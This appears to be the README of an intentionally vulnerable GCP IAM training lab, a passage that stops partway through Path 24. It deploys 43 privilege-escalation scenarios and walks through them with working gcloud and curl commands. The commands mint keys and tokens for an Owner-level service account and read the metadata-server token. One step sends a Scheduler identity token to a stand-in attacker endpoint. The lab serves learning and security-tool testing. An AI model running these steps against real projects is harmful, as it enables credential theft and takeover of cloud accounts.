# GCP IAM Vulnerable

Intentionally vulnerable GCP IAM configurations for learning privilege escalation and testing security tools.

## Prerequisites

1. **GCP Project**: An isolated test project with no production resources
2. **gcloud CLI**: Installed and configured
3. **Terraform**: Version 1.0+
4. **Permissions**: Owner or IAM Admin role on the project

## Quick Start

```bash
# Authenticate with GCP
gcloud auth login
gcloud auth application-default login

# Set your project
export PROJECT_ID="your-test-project-id"
gcloud config set project $PROJECT_ID

# Enable Service Usage API (required for Terraform to enable other APIs)
gcloud services enable serviceusage.googleapis.com --project $PROJECT_ID

# Configure your project
cp terraform.tfvars.example terraform.tfvars
# Edit terraform.tfvars and set gcp_project_id to your project ID

# Deploy
terraform init
terraform apply
```

**APIs enabled automatically by Terraform:**
- `iam.googleapis.com` - IAM API
- `cloudresourcemanager.googleapis.com` - Resource Manager API
- `compute.googleapis.com` - Compute Engine API
- `cloudfunctions.googleapis.com` - Cloud Functions API
- `cloudbuild.googleapis.com` - Cloud Build API
- `run.googleapis.com` - Cloud Run API
- `storage.googleapis.com` - Cloud Storage API
- `secretmanager.googleapis.com` - Secret Manager API

## Configuration

Edit `terraform.tfvars`:

```hcl
# Required: Your GCP project ID
gcp_project_id = "your-test-project-id"

# Optional: Region (default: us-central1)
gcp_region = "us-central1"

# Optional: Attacker identity (defaults to current user)
# attacker_member = "user:attacker@example.com"
```

## What Gets Created

### Free Resources (Default)

**43 Privilege Escalation Scenarios** grouped by GCP service:

| # | Scenario | Permission(s) | Status |
|---|----------|---------------|--------|
| **IAM Service Account** | | | |
| 1 | setIamPolicy-project | `resourcemanager.projects.setIamPolicy` | ✅ |
| 2 | createServiceAccountKey | `iam.serviceAccountKeys.create` | ✅ |
| 3 | setIamPolicy-serviceAccount | `iam.serviceAccounts.setIamPolicy` | ✅ |
| 4 | getAccessToken | `iam.serviceAccounts.getAccessToken` | ✅ |
| 5 | signBlob | `iam.serviceAccounts.signBlob` | ✅ |
| 6 | signJwt | `iam.serviceAccounts.signJwt` | ✅ |
| 7 | implicitDelegation | `iam.serviceAccounts.implicitDelegation` | ✅ |
| 8 | getOpenIdToken | `iam.serviceAccounts.getOpenIdToken` | ✅ |
| 9 | updateRole | `iam.roles.update` | ✅ |
| **Compute Engine** | | | |
| 10 | actAs-compute | `actAs` + `compute.instances.create` | ✅ |
| 11 | setMetadata-compute | `compute.instances.setMetadata` | ✅ |
| 12 | osLogin | `compute.instances.osAdminLogin` | ✅ |
| 13 | setServiceAccount | `compute.instances.setServiceAccount` | ✅ |
| 14 | instanceTemplates.create | `compute.instanceTemplates.create` | ✅ |
| **Cloud Functions** | | | |
| 15 | actAs-cloudfunction | `actAs` + `cloudfunctions.functions.create` | ✅ |
| 16 | updateFunction | `cloudfunctions.functions.update` | ✅ |
| 17 | sourceCodeSet | `cloudfunctions.functions.sourceCodeSet` | ✅ |
| **Cloud Run** | | | |
| 18 | actAs-cloudrun | `actAs` + `run.services.create` | ✅ |
| 19 | run.services.update | `run.services.update` | ✅ |
| 20 | run.jobs.create | `run.jobs.create` + `actAs` | ✅ |
| **Cloud Build** | | | |
| 21 | actAs-cloudbuild | `actAs` + `cloudbuild.builds.create` | ✅ |
| 22 | cloudbuild.triggers.create | `cloudbuild.builds.create` via trigger | ✅ |
| **Storage** | | | |
| 23 | setIamPolicy-bucket | `storage.buckets.setIamPolicy` | ✅ |
| 24 | storage.objects.create | Write to sensitive bucket | ✅ |
| **Secret Manager** | | | |
| 25 | secretManager | `secretmanager.versions.access` | ✅ |
| 26 | secretManager.setIamPolicy | `secretmanager.secrets.setIamPolicy` | ✅ |
| **Pub/Sub** | | | |
| 27 | setIamPolicy-pubsub | `pubsub.topics.setIamPolicy` | ✅ |
| **Cloud Scheduler** | | | |
| 28 | cloudScheduler | `cloudscheduler.jobs.create` | ✅ |
| **Deployment Manager** | | | |
| 29 | deploymentManager | `deploymentmanager.deployments.create` | ✅ |
| **Composer** | | | |
| 30 | composer | `composer.environments.create` | ✅ |
| **Dataflow** | | | |
| 31 | dataflow | `dataflow.jobs.create` | ✅ |
| **Dataproc** | | | |
| 32 | dataproc.clusters.create | `dataproc.clusters.create` + `actAs` | ✅ |
| 33 | dataproc.jobs.create | `dataproc.jobs.create` | ✅ |
| **GKE/Kubernetes** | | | |
| 34 | container.clusters.create | `container.clusters.create` + `actAs` | ✅ |
| 35 | container.clusters.getCredentials | Access GKE cluster | ✅ |
| **Vertex AI / AI Platform** | | | |
| 36 | notebooks.instances.create | `notebooks.instances.create` + `actAs` | ✅ |
| 37 | aiplatform.customJobs.create | `aiplatform.customJobs.create` | ✅ |
| **Cloud Workflows** | | | |
| 38 | workflows.workflows.create | `workflows.workflows.create` + `actAs` | ✅ |
| **Eventarc** | | | |
| 39 | eventarc.triggers.create | `eventarc.triggers.create` | ✅ |
| **BigQuery** | | | |
| 40 | bigquery.datasets.setIamPolicy | `bigquery.datasets.setIamPolicy` | ✅ |
| **Workload Identity** | | | |
| 41 | workloadIdentityPoolProviders | Federation abuse | ✅ |
| **Org Policy** | | | |
| 42 | orgpolicy.policy.set | `orgpolicy.policy.set` | ✅ |
| **Deny Bypass** | | | |
| 43 | explicitDeny-bypass | SA chaining | ✅ |

**Tool Testing Resources:**
- False Negative tests (should be detected)
- False Positive tests (should not be flagged)

### Non-Free Resources (Optional)

Enable via variables in `terraform.tfvars`:

| Module | Variable | Cost/Hour | Cost/Month | Description |
|--------|----------|-----------|------------|-------------|
| compute | `enable_compute = true` | ~$0.002 | ~$2-3 | VM with privileged SA |
| cloud-functions | `enable_cloud_functions = true` | $0 | Free tier | Function with privileged SA |
| cloud-run | `enable_cloud_run = true` | $0 | Free tier | Service with privileged SA |

**Example - Enable specific modules in `terraform.tfvars`:**
```hcl
gcp_project_id = "your-test-project-id"

# Enable only compute module
enable_compute = true
```

**Example - Enable all optional modules:**
```hcl
gcp_project_id = "your-test-project-id"

# Enable all non-free modules
enable_compute         = true
enable_cloud_functions = true
enable_cloud_run       = true
```

**Or via command line:**
```bash
terraform apply -var="enable_compute=true" -var="enable_cloud_functions=true"
```

## Cost Summary

| Configuration | Cost/Hour | Cost/Month |
|---------------|-----------|------------|
| **Default (43 IAM paths only)** | **$0.00** | **$0** |
| + Compute module (preemptible) | +$0.002 | +$2-3 |
| + Compute module (standard) | +$0.008 | +$6-7 |
| + Cloud Functions (idle) | +$0.00 | Free tier |
| + Cloud Run (idle) | +$0.00 | Free tier |
| **All modules enabled** | ~$0.01 | ~$5-10 |

**Note:** The default deployment creates only IAM resources (service accounts, custom roles, IAM bindings) which are **completely free**. Non-free modules must be explicitly enabled.

## Testing with FoxMapper

```bash
# Create a graph of your vulnerable project
foxmapper gcp graph create --project YOUR_PROJECT_ID

# Find privilege escalation paths
foxmapper gcp argquery --preset privesc --project YOUR_PROJECT_ID

# Find multiple paths
foxmapper gcp argquery --preset privesc --project YOUR_PROJECT_ID --paths 3

# List all admins
foxmapper gcp argquery --preset admin --project YOUR_PROJECT_ID
```

## Cleanup

### Standard Cleanup

```bash
terraform destroy
```

### When Terraform State is Lost

```bash
cd cleanup-scripts

# Preview what will be deleted
./cleanup_iam_vulnerable.sh --project YOUR_PROJECT_ID --dry-run

# Execute cleanup
./cleanup_iam_vulnerable.sh --project YOUR_PROJECT_ID
```

## Security Warning

**These resources are intentionally insecure.** Only deploy in:
- Isolated test projects
- Projects with no sensitive data
- Projects not connected to production systems

## Privilege Escalation Paths - Detailed Guide

### How It Works

Each privesc path follows this pattern:
1. **Attacker** (you) can impersonate a **vulnerable service account**
2. The **vulnerable SA** has permissions that allow escalation to a **high-privilege SA**
3. The **high-privilege SA** (`privesc-high-priv-sa@PROJECT.iam.gserviceaccount.com`) has Owner role

**Target Service Account (for all paths):**
```
privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com
```

### Getting to the Starting Point

For each path, you first need to impersonate the vulnerable service account:

```bash
# Set your project
export PROJECT_ID="your-project-id"

# Method 1: Set impersonation globally
gcloud config set auth/impersonate_service_account SERVICE_ACCOUNT_EMAIL

# Method 2: Per-command impersonation
gcloud COMMAND --impersonate-service-account=SERVICE_ACCOUNT_EMAIL

# Method 3: Generate access token
gcloud auth print-access-token --impersonate-service-account=SERVICE_ACCOUNT_EMAIL
```

---

### Path 1: setIamPolicy on Project

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc1-set-iam-policy@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `resourcemanager.projects.setIamPolicy` |
| **Target** | Project IAM policy |
| **Impact** | Grant yourself Owner role on the project |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc1-set-iam-policy@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Get current IAM policy
gcloud projects get-iam-policy $PROJECT_ID --format=json > policy.json

# Step 3: Edit policy.json to add yourself as Owner
# Add this binding to the "bindings" array:
# {
#   "role": "roles/owner",
#   "members": ["user:your-email@example.com"]
# }

# Step 4: Set the modified policy
gcloud projects set-iam-policy $PROJECT_ID policy.json

# Step 5: Clear impersonation and verify
gcloud config unset auth/impersonate_service_account
gcloud projects get-iam-policy $PROJECT_ID
```

---

### Path 2: Create Service Account Key

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc2-create-sa-key@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccountKeys.create` |
| **Target** | High-privilege service account |
| **Impact** | Persistent access via downloaded key |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc2-create-sa-key@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a key for the high-priv SA
gcloud iam service-accounts keys create key.json \
  --iam-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Clear impersonation
gcloud config unset auth/impersonate_service_account

# Step 4: Activate the stolen key
gcloud auth activate-service-account --key-file=key.json

# Step 5: Verify access
gcloud auth list
gcloud projects get-iam-policy $PROJECT_ID
```

---

### Path 3: setIamPolicy on Service Account

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc3-set-iam-policy-sa@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.setIamPolicy` |
| **Target** | High-privilege service account |
| **Impact** | Grant yourself token creator role on high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc3-set-iam-policy-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Grant yourself token creator on the high-priv SA
gcloud iam service-accounts add-iam-policy-binding \
  privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --member="user:your-email@example.com" \
  --role="roles/iam.serviceAccountTokenCreator"

# Step 3: Clear impersonation
gcloud config unset auth/impersonate_service_account

# Step 4: Now you can directly impersonate the high-priv SA
gcloud auth print-access-token \
  --impersonate-service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com
```

---

### Path 4: actAs + Compute Instance Create

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc4-actas-compute@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `compute.instances.create` |
| **Target** | New VM with high-priv SA attached |
| **Impact** | Access high-priv SA via VM metadata server |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc4-actas-compute@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a VM with the high-priv SA attached
gcloud compute instances create evil-vm \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --zone=us-central1-a

# Step 3: SSH to the VM
gcloud compute ssh evil-vm --zone=us-central1-a

# Step 4: From inside the VM, get the SA token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Cleanup
gcloud compute instances delete evil-vm --zone=us-central1-a --quiet
```

---

### Path 5: actAs + Cloud Functions Create

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc5-actas-function@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `cloudfunctions.functions.create` |
| **Target** | New function with high-priv SA |
| **Impact** | Execute code as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc5-actas-function@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create function source
mkdir /tmp/evil-function && cd /tmp/evil-function
cat > index.js << 'EOF'
const {google} = require('googleapis');
exports.handler = async (req, res) => {
  const auth = new google.auth.GoogleAuth({scopes: ['https://www.googleapis.com/auth/cloud-platform']});
  const token = await auth.getAccessToken();
  res.send(`Token: ${token}`);
};
EOF
cat > package.json << 'EOF'
{"dependencies": {"googleapis": "^100.0.0"}}
EOF

# Step 3: Deploy the function
gcloud functions deploy evil-function \
  --runtime=nodejs18 \
  --trigger-http \
  --allow-unauthenticated \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --region=us-central1

# Step 4: Invoke to get the token
curl $(gcloud functions describe evil-function --region=us-central1 --format='value(httpsTrigger.url)')

# Cleanup
gcloud functions delete evil-function --region=us-central1 --quiet
```

---

### Path 6: actAs + Cloud Run Create

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc6-actas-run@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `run.services.create` |
| **Target** | New Cloud Run service with high-priv SA |
| **Impact** | Execute containers as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc6-actas-run@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Deploy a Cloud Run service with the high-priv SA
gcloud run deploy evil-service \
  --image=gcr.io/cloudrun/hello \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --allow-unauthenticated \
  --region=us-central1

# Step 3: The service now runs with high-priv SA credentials

# Cleanup
gcloud run services delete evil-service --region=us-central1 --quiet
```

---

### Path 7: actAs + Cloud Build Create

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc7-actas-build@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `cloudbuild.builds.create` |
| **Target** | Build running as high-priv SA |
| **Impact** | Execute build steps as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc7-actas-build@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a build config that exfiltrates credentials
cat > /tmp/cloudbuild.yaml << 'EOF'
steps:
- name: 'gcr.io/cloud-builders/gcloud'
  entrypoint: 'bash'
  args:
  - '-c'
  - |
    echo "Running as:"
    gcloud auth list
    echo "Token:"
    gcloud auth print-access-token
EOF

# Step 3: Submit the build with the high-priv SA
gcloud builds submit --no-source \
  --config=/tmp/cloudbuild.yaml \
  --service-account=projects/$PROJECT_ID/serviceAccounts/privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com
```

---

### Path 8: getAccessToken (Direct Impersonation)

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc8-get-access-token@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.getAccessToken` |
| **Target** | High-priv SA access token |
| **Impact** | Direct token generation |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc8-get-access-token@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Generate an access token for the high-priv SA
# The vulnerable SA has Token Creator role on the high-priv SA
gcloud auth print-access-token \
  --impersonate-service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Use the token directly
TOKEN=$(gcloud auth print-access-token \
  --impersonate-service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com)

curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID:getIamPolicy" \
  -X POST -H "Content-Type: application/json" -d '{}'
```

---

### Path 9: signBlob

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc9-sign-blob@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.signBlob` |
| **Target** | Sign data as high-priv SA |
| **Impact** | Create signed URLs, forge tokens |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc9-sign-blob@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Sign arbitrary data as the high-priv SA
echo "data to sign" | gcloud iam service-accounts sign-blob \
  --iam-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  - signed-output.bin

# This can be used to:
# - Create signed URLs for GCS objects
# - Forge JWTs for authentication
# - Sign arbitrary data for verification
```

---

### Path 10: signJwt

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc10-sign-jwt@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.signJwt` |
| **Target** | Sign JWTs as high-priv SA |
| **Impact** | Generate access tokens via signed JWT |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc10-sign-jwt@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a JWT claim set
cat > /tmp/jwt-claim.json << EOF
{
  "iss": "privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com",
  "sub": "privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com",
  "aud": "https://oauth2.googleapis.com/token",
  "iat": $(date +%s),
  "exp": $(($(date +%s) + 3600)),
  "scope": "https://www.googleapis.com/auth/cloud-platform"
}
EOF

# Step 3: Sign the JWT
gcloud iam service-accounts sign-jwt \
  --iam-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  /tmp/jwt-claim.json /tmp/signed-jwt.txt

# Step 4: Exchange signed JWT for access token
curl -X POST https://oauth2.googleapis.com/token \
  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
  -d "assertion=$(cat /tmp/signed-jwt.txt)"
```

---

### Path 11: updateRole (Custom Role Modification)

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc11-update-role@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.roles.update` |
| **Target** | Custom role already assigned to the SA |
| **Impact** | Add any permission to your role |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc11-update-role@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Find the custom role assigned to this SA
gcloud iam roles list --project=$PROJECT_ID --format="table(name,title)"

# Step 3: Update the role to add powerful permissions
gcloud iam roles update privesc_11_vulnerable_role \
  --project=$PROJECT_ID \
  --add-permissions=resourcemanager.projects.setIamPolicy

# Step 4: Now the SA (and you) have setIamPolicy permission
# Continue with Path 1 exploitation
```

---

### Path 12: setMetadata on Compute (SSH Key Injection)

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc12-set-metadata@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `compute.instances.setMetadata` |
| **Target** | Existing VM with high-priv SA |
| **Impact** | SSH access to VM, steal SA credentials |
| **Requires** | `enable_compute = true` module |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc12-set-metadata@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Generate SSH key
ssh-keygen -t rsa -f /tmp/evil-key -N ""

# Step 3: Add your SSH key to the target instance
gcloud compute instances add-metadata privesc-instance \
  --zone=us-central1-a \
  --metadata="ssh-keys=attacker:$(cat /tmp/evil-key.pub)"

# Step 4: SSH to the instance
ssh -i /tmp/evil-key attacker@INSTANCE_EXTERNAL_IP

# Step 5: From inside the VM, get the SA token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

---

### Path 13: OS Login (Admin SSH Access)

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc13-os-login@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `compute.instances.osAdminLogin` |
| **Target** | VM with OS Login enabled |
| **Impact** | Root SSH access, steal SA credentials |
| **Requires** | `enable_compute = true` module |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc13-os-login@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: SSH using OS Login
gcloud compute ssh privesc-instance \
  --zone=us-central1-a \
  --tunnel-through-iap

# Step 3: From inside the VM, get the SA token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

---

### Path 14: setIamPolicy on Storage Bucket

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc14-bucket-iam@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `storage.buckets.setIamPolicy` |
| **Target** | Storage bucket with sensitive data |
| **Impact** | Grant yourself access to bucket contents |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc14-bucket-iam@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Grant yourself access to the bucket
gsutil iam ch user:your-email@example.com:objectViewer gs://BUCKET_NAME

# Step 3: Or grant public access
gsutil iam ch allUsers:objectViewer gs://BUCKET_NAME

# Step 4: Clear impersonation and access the bucket
gcloud config unset auth/impersonate_service_account
gsutil ls gs://BUCKET_NAME
```

---

### Path 15: Update Cloud Function Code

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc15-update-function@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `cloudfunctions.functions.update` |
| **Target** | Existing function with high-priv SA |
| **Impact** | Inject code that runs as high-priv SA |
| **Requires** | `enable_cloud_functions = true` module |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc15-update-function@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create malicious function code
mkdir /tmp/evil-code && cd /tmp/evil-code
cat > index.js << 'EOF'
exports.handler = async (req, res) => {
  const token = await require('googleapis').google.auth.getAccessToken();
  res.send(`Stolen token: ${token}`);
};
EOF
cat > package.json << 'EOF'
{"dependencies": {"googleapis": "^100.0.0"}}
EOF

# Step 3: Update the existing function with malicious code
gcloud functions deploy privesc-function \
  --source=/tmp/evil-code \
  --region=us-central1

# Step 4: Invoke the modified function
curl $(gcloud functions describe privesc-function --region=us-central1 --format='value(httpsTrigger.url)')
```

---

### Path 16: Explicit Deny Bypass via SA Chaining

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc16-deny-bypass@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | Token Creator on intermediate SA |
| **Target** | Bypass IAM deny policies |
| **Impact** | Access resources denied to your user |

```bash
# Step 1: Your user might be denied direct access
# But you can impersonate an SA that isn't denied

# Step 2: Impersonate the intermediate SA
gcloud config set auth/impersonate_service_account \
  privesc16-deny-bypass@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: The SA can then impersonate another SA
gcloud auth print-access-token \
  --impersonate-service-account=privesc-medium-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 4: Chain to the high-priv SA
# The deny policy doesn't apply through the SA chain
```

---

### Path 17: Deployment Manager

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc17-deployment-mgr@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `deploymentmanager.deployments.create` |
| **Target** | Deploy resources as high-priv SA |
| **Impact** | Create any GCP resource with elevated privileges |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc17-deployment-mgr@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a deployment config that grants you access
cat > /tmp/deployment.yaml << EOF
resources:
- name: evil-iam-binding
  type: gcp-types/cloudresourcemanager-v1:virtual.projects.iamMemberBinding
  properties:
    resource: $PROJECT_ID
    role: roles/owner
    member: user:your-email@example.com
EOF

# Step 3: Create the deployment
gcloud deployment-manager deployments create evil-deployment \
  --config=/tmp/deployment.yaml

# Cleanup
gcloud deployment-manager deployments delete evil-deployment --quiet
```

---

### Path 18: Composer (Cloud Composer/Airflow)

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc18-composer@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `composer.environments.create` + `actAs` |
| **Target** | Airflow environment with high-priv SA |
| **Impact** | Execute DAGs as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc18-composer@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a Composer environment (expensive - ~$300/mo)
# This is typically IAM-only in the lab
gcloud composer environments create evil-composer \
  --location=us-central1 \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# The Airflow workers will run with the high-priv SA
```

---

### Path 19: Dataflow

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc19-dataflow@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `dataflow.jobs.create` + `actAs` |
| **Target** | Dataflow job with high-priv SA |
| **Impact** | Execute data pipeline as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc19-dataflow@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a Dataflow job with the high-priv SA
gcloud dataflow jobs run evil-job \
  --gcs-location=gs://dataflow-templates/latest/Word_Count \
  --service-account-email=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --parameters=inputFile=gs://dataflow-samples/shakespeare/kinglear.txt,output=gs://BUCKET/output

# The job workers run with high-priv SA credentials
```

---

### Path 20: Secret Manager Access

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc20-secret-access@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `secretmanager.versions.access` |
| **Target** | Secrets containing credentials |
| **Impact** | Read sensitive secrets |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc20-secret-access@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: List accessible secrets
gcloud secrets list

# Step 3: Access a secret value
gcloud secrets versions access latest --secret=SECRET_NAME

# Step 4: Secrets might contain:
# - API keys
# - Database credentials
# - Other service account keys
```

---

### Path 21: setIamPolicy on Pub/Sub

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc21-pubsub-iam@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `pubsub.topics.setIamPolicy` |
| **Target** | Pub/Sub topics/subscriptions |
| **Impact** | Grant access to message data |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc21-pubsub-iam@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Grant yourself access to a topic
gcloud pubsub topics add-iam-policy-binding TOPIC_NAME \
  --member="user:your-email@example.com" \
  --role="roles/pubsub.subscriber"

# Step 3: Clear impersonation and read messages
gcloud config unset auth/impersonate_service_account
gcloud pubsub subscriptions pull SUBSCRIPTION_NAME
```

---

### Path 22: Cloud Scheduler

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc22-scheduler@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `cloudscheduler.jobs.create` + `actAs` |
| **Target** | Scheduled job with high-priv SA |
| **Impact** | Execute HTTP calls as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc22-scheduler@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a scheduler job that calls a service as high-priv SA
gcloud scheduler jobs create http evil-scheduler \
  --schedule="* * * * *" \
  --uri="https://your-evil-endpoint.com/receive-token" \
  --http-method=POST \
  --oidc-service-account-email=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --location=us-central1

# The scheduler will make HTTP requests with the high-priv SA's identity token
```

---

### Path 23: Implicit Delegation (Multi-hop)

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc23-implicit-deleg@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.implicitDelegation` |
| **Target** | Chain through multiple SAs |
| **Impact** | Reach high-priv SA via delegation chain |

```bash
# Step 1: Impersonate the first SA in the chain
gcloud config set auth/impersonate_service_account \
  privesc23-implicit-deleg@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: This SA can impersonate the medium-priv SA
# And medium-priv SA can impersonate the high-priv SA

# Step 3: Request a token with delegation chain
gcloud auth print-access-token \
  --impersonate-service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --delegates=privesc-medium-priv-sa@$PROJECT_ID.iam.gserviceaccount.com
```

---

### Path 24: getOpenIdToken (OIDC)

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc24-get-oidc-token@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.getOpenIdToken` |
| **Target** | Generate OIDC tokens for high-priv SA |
| **Impact** | Authenticate to OIDC-protected services |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc24-get-oidc-token@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Generate an OIDC identity token for the high-priv SA
gcloud auth print-identity-token \
  --impersonate-service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --audiences="https://example.com"

# Step 3: Use the token to access OIDC-protected services
TOKEN=$(gcloud auth print-identity-token \
  --impersonate-service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
